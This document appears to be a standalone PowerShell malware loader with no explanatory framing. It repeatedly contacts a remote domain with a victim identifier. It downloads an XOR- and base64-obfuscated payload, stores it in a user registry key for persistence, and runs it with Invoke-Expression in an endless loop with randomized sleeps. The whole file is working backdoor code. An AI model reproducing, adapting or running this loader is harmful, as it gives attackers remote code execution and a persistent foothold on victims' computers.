

$jd = $null;
$sta=[System.Text.Encoding]::ASCII;



function sltValue([string]$ar2) {
	$ar1=[System.Convert]::FromBase64String($ar2);

	$st=$sta.GetBytes('Get-ItemPropertyValue');
	$ed=$ar1[0..4];

	$i=0;
	$l=$ed.Length;
	$k=@();

	[array]::Resize([ref]$k,$st.length);
	foreach($b in $st) {$k[$i++]=$b -bxor $ed[$i%$l]}

	$bs=$ar1[5..$ar1.length];

	$i=0;
	$l=$k.Length;
	$dt=@();

	[array]::Resize([ref]$dt,$bs.length);
	foreach($b in $bs) {$dt[$i++]=$b -bxor $k[$i%$l]}

	return $sta.GetString($dt) | ConvertFrom-Json;
}

$v = "0";
$lv = "6";
$d = "rockslootni.com";
$ep = "WyI4NDkxMDc3MTg5OTg2NTg3NDMiLDE2NTE1OTcwMjFd";

$pathRG = "HKCU:\Software\aignes\";

$jp=$null;
try {
	$jp=$sta.GetString([System.Convert]::FromBase64String($ep)) | ConvertFrom-Json;
} catch{}

$a = $sta;

$u=$jp[0];
$is=$jp[1];

$rName = "deadlinks";

while($true) {
	try {
		try {
			if (!(Test-Path $pathRG)) {
				New-Item -Path $pathRG | Out-Null;
			}
		}catch{}

		$ex = $false;

		if ($jd -eq $null) {
			try {
				$r = Get-ItemPropertyValue -Path $pathRG -Name $rName;
				$jd = sltValue($r);

				$v = $jd[0];

				$ex = $true;
			}catch{}
		} else {
			$v = $jd[0];
		}

		try {
			$dt = wget "https://$d/x?u=$u&is=$is&lv=$lv&rv=$v" -UseBasicParsing;

			$jd2 = sltValue($dt);
			if ($jd2[0] -gt $v) {
				$v2 = $jd2[0];

				New-ItemProperty -Path $pathRG -Name $rName -Value $dt -PropertyType "String" -Force | Out-Null;
				$jd = $jd2;
				$ex = $true;
			}
		}catch{}

		if ($ex -eq $true) {
			try{
				stop;
			}catch{}

			try {
				iex $jd[1];
			}catch{}
		}
	} catch{}

	try {
		$sls = ((get-random 70 -minimum 50)*60);
		$ts = [int](Get-Date -UFormat %s);

		:sl while($true) {
			try{
				run($d,$u,$is);
			}catch{}

			Start-Sleep (get-random 65 -minimum 25);
			$ts2 = [int](Get-Date -UFormat %s);

			if (($ts2-$ts) -gt $sls) {
				break sl;
			}
		}
	} catch{}
}